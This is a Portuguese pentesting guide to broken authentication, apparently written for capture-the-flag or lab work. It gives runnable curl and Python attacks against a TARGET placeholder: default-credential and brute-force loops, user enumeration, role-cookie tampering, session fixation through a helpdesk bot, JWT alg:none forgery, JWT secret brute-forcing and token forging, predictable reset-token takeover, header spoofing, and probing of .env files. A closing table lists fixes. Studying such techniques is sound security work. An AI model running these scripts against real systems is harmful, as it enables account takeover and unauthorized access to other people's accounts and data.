# Broken Authentication — Guia Completo

> Falhas na autenticação ou gestão de sessões que permitem assumir a identidade de outro utilizador.

## CWEs
- CWE-287 — Improper Authentication
- CWE-384 — Session Fixation
- CWE-345 — Insufficient Verification of Data Authenticity (JWT)
- CWE-330 — Use of Insufficiently Random Values
- CWE-307 — Improper Restriction of Excessive Authentication Attempts
- CWE-204 — Observable Response Discrepancy (User Enumeration)
- CWE-257 — Storing Passwords in a Recoverable Format
- CWE-613 — Insufficient Session Expiration
- CWE-602 — Client-Side Enforcement of Server-Side Security
- CWE-293 — Using Referer Field for Authentication
- CWE-1392 — Use of Default Credentials

---

## Como reconhecer

- Form de login (username/password)
- Cookies de sessão (session ID, JWT, role cookie)
- Headers de autenticação (Basic, Bearer, API key)
- Funcionalidade de "reset password" ou "forgot password"
- Páginas admin/dashboard protegidas

---

## Sub-tipos e metodologia

### A) Credenciais default

**Quando testar:** a app parece ser appliance, router, CMS, painel de gestão.

```bash
# Pares comuns — testar primeiro estes
admin:admin
admin:admin123
admin:password
admin:1234
admin:12345678
root:root
root:toor
guest:guest
guest:guest123
user:user
test:test
```

```bash
# Script para testar automaticamente
for pair in "admin:admin" "admin:admin123" "admin:password" "root:root" "guest:guest123"; do
  USER=$(echo $pair | cut -d: -f1)
  PASS=$(echo $pair | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -L -X POST \
    http://TARGET/login -d "username=$USER&password=$PASS")
  echo "$pair → $CODE"
done

# HTTP Basic Auth
for pair in "admin:admin" "admin:admin123" "admin:password"; do
  USER=$(echo $pair | cut -d: -f1)
  PASS=$(echo $pair | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASS" http://TARGET/admin)
  echo "$pair → $CODE"
done
```

### B) Brute-force (sem rate limiting)

**Detetar ausência de rate limit:** enviar 20 logins errados rápido — se nenhum dá 429, lockout, ou CAPTCHA, não há limit.

```bash
# Wordlist curta de passwords comuns
for pw in password 123456 qwerty admin letmein welcome monkey \
          master dragon login abc123 admin123 iloveyou trustno1; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -L -X POST \
    http://TARGET/login -d "username=admin&password=$pw")
  echo "$pw → $CODE"
  # Parar no primeiro sucesso (302 = redirect = login OK)
  [ "$CODE" = "302" ] || [ "$CODE" = "200" ] && break
done
```

**Dica:** se o login bem-sucedido faz redirect (302), o mal-sucedido dá 200 ou 401.

### C) User enumeration

**Detetar:** mensagens de erro **diferentes** para user inválido vs password errada.

```bash
# Testar user que existe vs user que não existe
curl -s -X POST http://TARGET/login -d "emp_id=admin&password=wrong"
# "Incorrect password" → user EXISTE

curl -s -X POST http://TARGET/login -d "emp_id=zzzzz&password=wrong"
# "No such employee" → user NÃO EXISTE
```

**Explorar:** enumerar users válidos, depois brute-force passwords neles.

```bash
# Procurar usernames na própria app (roster, about, staff page)
curl -s http://TARGET/roster
curl -s http://TARGET/about
curl -s http://TARGET/team
```

**Formatos comuns de username:** `jbarreira`, `joao.barreira`, `jb123`, email

### D) Cookie/role editável no client

**Detetar:** olha para os cookies depois de fazer login.

```bash
# Login normal
curl -s -c cookies.txt -L -X POST http://TARGET/login -d "username=user&password=user123"
cat cookies.txt
```

Se vês cookies como `role=employee`, `admin=false`, `is_staff=0`:
```bash
# Editar o cookie
curl -s -b "role=manager" http://TARGET/manager
curl -s -b "role=admin" http://TARGET/admin
curl -s -b "admin=true" http://TARGET/dashboard
curl -s -b "is_staff=1" http://TARGET/staff
```

**Também funciona com cookies base64:**
```bash
echo "dXNlcj1hZG1pbg==" | base64 -d   # user=admin
echo -n "user=admin;role=admin" | base64  # forjar novo cookie
```

### E) Session fixation

**Conceito:** forçar um utilizador a usar o **teu** session ID. Quando ele faz login, o teu sid fica autenticado.

**Detetar:** fazer login e verificar se o session ID **muda** (se não muda → fixation possível).

```bash
# 1. Obter um sid (antes do login)
SID=$(curl -s -c - http://TARGET/ | grep sid | awk '{print $NF}')
echo "Meu SID: $SID"

# 2. Fazer login COM este sid
curl -s -c - -L -X POST http://TARGET/login \
  -b "sid=$SID" -d "username=user&password=pass"

# 3. Verificar: o sid mudou? Se NÃO → session fixation possível
```

**Explorar (se há bot/helpdesk):**
```bash
# Fazer o bot autenticar-se com o TEU sid
curl -s -X POST http://TARGET/helpdesk/verify-link -b "sid=$SID"
# Agora o TEU sid está autenticado como o bot/admin
curl -s -b "sid=$SID" http://TARGET/dashboard
```

### F) JWT — alg:none

**Conceito:** o campo `alg` no header JWT diz que algoritmo usar para verificar. Se o servidor aceita `"alg":"none"`, não verifica a assinatura.

**Detetar:** descodifica o JWT e vê o header:
```bash
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
# {"alg":"HS256"} → testar se aceita none
```

**Forjar token:**
```bash
# Header: {"alg":"none","typ":"JWT"}
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')

# Payload: o que quiseres (ex: admin)
P=$(echo -n '{"user":"admin","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')

# Token SEM assinatura (termina em .)
TOKEN="${H}.${P}."
echo "$TOKEN"

# Usar
curl -s -H "Authorization: Bearer $TOKEN" http://TARGET/admin
curl -s -b "token=$TOKEN" http://TARGET/admin
```

**Variantes:**
```bash
# alg: None, NONE, nOnE (case sensitivity bugs)
echo -n '{"alg":"None","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
echo -n '{"alg":"NONE","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
```

### G) JWT — weak secret (brute-force)

**Conceito:** JWT assinado com HMAC (HS256) usa um secret. Se o secret é fraco, pode ser brute-forced.

```bash
# Obter token válido
TOKEN=$(curl -s -c - -X POST http://TARGET/login \
  -d "user=guest&password=guest123" | grep token | awk '{print $NF}')
```

**Brute-force com script Python:**
```python
import hmac, hashlib, base64

token = "header.payload.signature"
header_payload = token.rsplit('.', 1)[0]
original_sig = token.rsplit('.', 1)[1]

# Testar PINs de 4 dígitos
for pin in range(10000):
    secret = f"{pin:04d}"
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == original_sig:
        print(f"Secret encontrado: {secret}")
        break
```

**Depois de encontrar o secret — forjar novo token:**
```python
import json, hmac, hashlib, base64

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64url(json.dumps({"user":"admin","role":"admin"}).encode())
sig = b64url(hmac.new(b"SECRET", f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
```

### H) Tokens previsíveis

**Conceito:** o session token ou reset token é gerado com lógica previsível (timestamp, username hash, contador sequencial).

**Detetar:** obter vários tokens e procurar padrões:
```bash
# Vários logins → os tokens são sequenciais? Similares?
for i in $(seq 1 5); do
  curl -s -c - -X POST http://TARGET/login -d "user=guest&password=guest" | grep token
done
```

**Exemplos de tokens fracos:**
```bash
# Token = sha1("username:timestamp")
TOKEN=$(echo -n "admin:$(date +%s)" | sha1sum | cut -d' ' -f1)

# Token = sha256("reset:username")[:20]
TOKEN=$(echo -n "reset:admin" | sha256sum | cut -c1-20)

# Token = md5(username)
TOKEN=$(echo -n "admin" | md5sum | cut -d' ' -f1)

# Token = base64("user=admin")
TOKEN=$(echo -n "user=admin" | base64)
```

**Explorar reset token previsível:**
```bash
TOKEN=$(echo -n "reset:admin" | sha256sum | cut -c1-20)
curl -X POST "http://TARGET/reset/$TOKEN" -d "password=hacked"
curl -c cookies.txt -L -X POST http://TARGET/login -d "username=admin&password=hacked"
```

### I) Trust em headers (Referer, X-Forwarded-For)

**Quando testar:** página que "só deveria ser acessível de dentro" (intranet, staff area).

```bash
curl http://TARGET/internal/page \
  -H "Referer: http://TARGET/staff-home"

curl http://TARGET/admin \
  -H "X-Forwarded-For: 127.0.0.1"

curl http://TARGET/admin \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Original-URL: /admin"
```

### J) Session não expirada (logout falso)

**Conceito:** logout limpa o cookie no browser, mas NÃO invalida a sessão no servidor.

**Detetar:** fazer login, copiar o session ID, fazer logout, reusar o session ID.

```bash
# Login e guardar sid
curl -s -c cookies.txt -L -X POST http://TARGET/login -d "user=x&pw=x"
SID=$(grep sid cookies.txt | awk '{print $NF}')

# Logout
curl -s -b cookies.txt http://TARGET/logout

# Reusar o sid antigo — se funciona, logout é falso
curl -s -b "sid=$SID" http://TARGET/dashboard
```

**Explorar:** se há logs ou diagnostics que mostram session IDs de outros utilizadores:
```bash
curl -s http://TARGET/diagnostics | grep -oP '[a-f0-9]{32}'
```

### K) Credential store exposto

**Detetar:**
```bash
curl http://TARGET/robots.txt            # Disallow: /export/ ?
curl http://TARGET/export/               # listing?
curl http://TARGET/backup/               # dumps?
curl http://TARGET/.env                  # credenciais?
```

**Passwords em base64 ≠ encriptadas!**
```bash
echo "YWRtaW4xMjM=" | base64 -d    # admin123
```

---

## Árvore de decisão

```
Há form de LOGIN?
├── Testar credenciais default (admin:admin, admin:admin123...)
├── Testar SQLi no login (admin' --)
├── Olhar cookies pós-login
│   ├── role=user, admin=false → editar cookie
│   ├── JWT (xxx.yyy.zzz) → descodificar
│   │   ├── alg:none → forjar sem assinatura
│   │   └── HS256 → brute-force secret
│   └── sid=abc123 → session fixation?
│
├── Testar mensagens de erro (enumeration)
│   └── Diferentes para user/password → enumerar users → brute-force
│
├── Funcionalidade de reset password?
│   └── Token previsível? (hash de username, timestamp)
│
├── Há logs/diagnostics com session IDs?
│   └── Reusar sid de outro utilizador
│
└── Há exports/backups acessíveis?
    └── Credenciais em plaintext ou base64
```

---

## Fix correto

| Problema | Fix |
|----------|-----|
| Credenciais default | Forçar troca no primeiro login |
| Sem rate limit | Rate limiting + lockout após N tentativas + CAPTCHA |
| User enumeration | Mensagem genérica ("Invalid credentials") |
| Cookie editável | Guardar role no servidor (sessão), nunca no cookie |
| JWT alg:none | Verificar alg contra whitelist; rejeitar none |
| JWT weak secret | Secret ≥256 bits (random); rotação periódica |
| Token previsível | CSPRNG (`os.urandom`, `secrets.token_hex`) |
| Session fixation | Regenerar session ID no login |
| Referer trust | Nunca usar Referer/X-Forwarded-For para autenticação |
| Logout falso | Invalidar sessão no servidor + limpar cookie |
| Passwords em plaintext | bcrypt/argon2 + salt |
